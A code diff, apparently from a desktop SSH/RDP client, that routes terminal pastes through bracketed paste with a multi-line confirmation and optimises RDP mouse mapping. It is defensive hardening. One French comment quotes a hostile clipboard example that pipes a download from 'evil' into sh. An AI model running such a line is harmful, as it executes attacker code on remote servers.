@@ -17,6 +17,7 @@ import { check as checkUpdate } from "@tauri-apps/plugin-updater";
 import { relaunch } from "@tauri-apps/plugin-process";
 import { ic, fileIconName, hydrateIcons } from "./icons";
 import { partageClipboard, setPartageClipboard } from "./prefs";
+import { collageAValider, nombreLignesCollage } from "./collage";
 import {
   humanSize, filterHosts, allTags, remoteJoin, parentDir, isPasswordRequired, isHostKeyChanged, stripHtml, hostInitials, hostHue, osBadge,
   sortSftpEntries, shortDate, shellQuote, validFileName, snippetPreview, snippetVars, renderSnippet, type SftpEntry, type Snippet,
@@ -748,7 +749,7 @@ function newSessionShell(label: string) {
     }
     if (mod && e.code === "KeyV") {
       navigator.clipboard.readText().then(
-        (t) => invoke("pty_write", { id, data: t }).catch(() => {}),
+        (t) => void collerDansTerminal(term, t),
         () => {},
       );
       return false;
@@ -1721,6 +1722,31 @@ window.addEventListener("keydown", (e) => {
 // les suppressions passaient sans confirmation. Cette modale, elle, attend
 // vraiment le choix de l'utilisateur (comme askText remplace prompt).
 // Convention : la 1re ligne du texte est le titre, le reste le détail.
+// Colle du texte dans un terminal distant, TOUJOURS via term.paste() — jamais
+// en écrivant les octets bruts dans pty_write. La différence est de sécurité :
+// term.paste() encadre le texte en « bracketed paste » quand le shell distant
+// l'a demandé (DECSET 2004), ce qui empêche un saut de ligne collé de s'exécuter
+// tout seul. Écrire les octets bruts (ce que faisaient Ctrl+Maj+V et le menu
+// « Coller ») court-circuitait cette protection : une page web hostile plaçant
+// « cmd\ncurl http://evil|sh\n » dans le presse-papiers faisait exécuter la
+// seconde ligne sur le serveur, invisible. Le collage natif Ctrl+V, lui, passait
+// déjà par onData et était protégé. On confirme en plus tout collage multi-ligne,
+// car le distant peut ne pas avoir activé le bracketed paste.
+async function collerDansTerminal(term: Terminal, texte: string): Promise<void> {
+  if (!texte) return;
+  if (collageAValider(texte)) {
+    const n = nombreLignesCollage(texte);
+    const ok = await askConfirm(
+      `Coller ${n} ligne${n > 1 ? "s" : ""} dans le terminal ?\n\n` +
+        "Une ligne collée qui se termine par un saut de ligne s'exécute aussitôt. " +
+        "Ne colle que du texte dont tu connais la source.",
+      { ok: "Coller", danger: true },
+    );
+    if (!ok) return;
+  }
+  term.paste(texte);
+}
+
 let confirmResolve: ((v: boolean) => void) | null = null;
 function askConfirm(text: string, opts: { ok?: string; danger?: boolean } = {}): Promise<boolean> {
   const [title, ...rest] = text.split("\n\n");
@@ -2472,7 +2498,7 @@ ctxMenu().addEventListener("click", (e) => {
     if (sel) navigator.clipboard.writeText(sel).catch(() => {});
   } else if (act === "paste") {
     navigator.clipboard.readText().then(
-      (t) => invoke("pty_write", { id: s.id, data: t }).catch(() => {}),
+      (t) => void collerDansTerminal(s.term, t),
       () => {},
     );
   } else if (act === "search") {
@@ -3399,7 +3425,7 @@ async function pushLocalClipboard(force = false): Promise<void> {
 // serveur RDP ouvert, sans le moindre geste de l'utilisateur, et à chaque
 // bascule de fenêtre. Il ne part plus que sur un collage explicite (Ctrl+V) ou
 // quand le serveur le réclame, dans l'onglet actif.
-const rdpSessions = new Map<number, { canvas: HTMLCanvasElement; tab: HTMLElement; ws: WebSocket | null; ro?: ResizeObserver; hostId?: string; syncSize?: () => void; target?: RdpTarget }>();
+const rdpSessions = new Map<number, { canvas: HTMLCanvasElement; tab: HTMLElement; ws: WebSocket | null; ro?: ResizeObserver; detachRect?: () => void; hostId?: string; syncSize?: () => void; target?: RdpTarget }>();
 
 async function openRdp(t: RdpTarget) {
   const id = state.nextId++;
@@ -3455,8 +3481,24 @@ async function openRdp(t: RdpTarget) {
     if (s?.ws && s.ws.readyState === WebSocket.OPEN) s.ws.send(new Uint8Array(bytes));
   };
   // Mappage souris -> pixels du bureau (letterbox object-fit:contain), testé.
+  // getBoundingClientRect force un recalcul de mise en page synchrone : l'appeler
+  // à CHAQUE mousemove (jusqu'à 1000/s sur une souris rapide) rivalisait avec les
+  // putImageData de la même trame. On mémorise le rect et on ne l'invalide que
+  // lorsque la géométrie change réellement (redimensionnement, défilement, focus).
+  let rectCache: DOMRect | null = null;
+  const rectCanvas = (): DOMRect => (rectCache ??= canvas.getBoundingClientRect());
+  const invaliderRect = () => { rectCache = null; };
   const pos = (e: MouseEvent): [number, number] =>
-    rdpMousePos(e.clientX, e.clientY, canvas.getBoundingClientRect(), rdpW, rdpH);
+    rdpMousePos(e.clientX, e.clientY, rectCanvas(), rdpW, rdpH);
+  // Le rect bouge avec la fenêtre et le défilement de la page ; on l'oublie alors.
+  window.addEventListener("resize", invaliderRect);
+  window.addEventListener("scroll", invaliderRect, true);
+  // Retirés à la fermeture de l'onglet : sans quoi ils s'accumuleraient à chaque
+  // bureau ouvert puis fermé.
+  const detachRect = () => {
+    window.removeEventListener("resize", invaliderRect);
+    window.removeEventListener("scroll", invaliderRect, true);
+  };
   // Mouvements souris throttlés au rAF : un seul paquet par frame d'affichage.
   let moveX = 0, moveY = 0, movePending = false;
   canvas.addEventListener("mousemove", (e) => {
@@ -3484,6 +3526,7 @@ async function openRdp(t: RdpTarget) {
   // Focus du bureau distant = l'utilisateur va sans doute coller : on lui pousse
   // le presse-papiers local à jour (fiabilise le collage local->distant).
   canvas.addEventListener("focus", () => {
+    invaliderRect(); // l'onglet vient (peut-être) de devenir visible : rect à relire
     void currentLocks().then((l) => { if (l !== null) send([10, l]); });
     void pushLocalClipboard(true);
   });
@@ -3507,11 +3550,13 @@ async function openRdp(t: RdpTarget) {
     send([5, ...le16(w), ...le16(h)]);
   };
   const ro = new ResizeObserver(() => {
+    invaliderRect(); // la zone a changé de taille : le rect mémorisé est périmé
     window.clearTimeout(resizeTimer);
     resizeTimer = window.setTimeout(sendResize, 400);
   });
   ro.observe($("terminal"));
   rdpSessions.get(id)!.ro = ro;
+  rdpSessions.get(id)!.detachRect = detachRect;
   rdpSessions.get(id)!.syncSize = sendResize;
 
   // Bureau reçu via WebSocket local BINAIRE (ArrayBuffer natif : ni base64 ni
@@ -3764,6 +3809,7 @@ function closeRdp(id: number) {
     getCurrentWindow().setFullscreen(false).catch(() => {});
   }
   s.ro?.disconnect();
+  s.detachRect?.();
   s.ws?.close();
   invoke("rdp_close", { id }).catch(() => {});
   s.canvas.parentElement?.remove();
